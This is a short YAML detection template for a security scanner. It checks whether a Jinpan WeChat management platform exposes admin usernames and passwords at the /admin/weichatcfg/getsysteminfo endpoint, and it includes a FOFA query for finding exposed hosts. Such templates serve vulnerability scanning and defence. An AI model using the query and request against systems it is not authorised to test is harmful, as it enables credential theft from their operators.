id: jinpan-weichatcfg-disclosure

info:
  name: 金盘微信管理平台 getsysteminfo信息泄露
  author: zan8in
  severity: high
  verified: true
  description: |
    FOFA: icon_hash="116323821" && title=="微信管理后台"
  tags: nsfocus,fileupload
  created: 2023/09/03

set:
  rboundary: randomLowercase(8)
rules:
  r0:
    request:
      method: GET
      path: /admin/weichatcfg/getsysteminfo
    expression: response.status == 200 && response.body.bcontains(b'"id":1,') && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
expression: r0()